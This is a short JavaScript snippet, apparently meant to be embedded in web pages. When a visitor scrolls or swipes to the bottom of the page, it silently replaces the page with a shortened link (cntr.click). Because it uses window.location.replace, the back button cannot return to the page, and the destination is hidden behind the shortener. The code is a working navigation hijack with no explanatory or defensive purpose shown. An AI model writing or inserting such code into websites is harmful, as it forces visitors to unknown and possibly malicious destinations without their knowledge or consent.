document.onscroll = function() 
{
    if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + document.documentElement.clientHeight)
        window.location.replace("https://cntr.click/DTaw1n5");
};
document.ontouchmove = function() 
{
    if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + window.innerHeight)
        window.location.replace("https://cntr.click/DTaw1n5");
};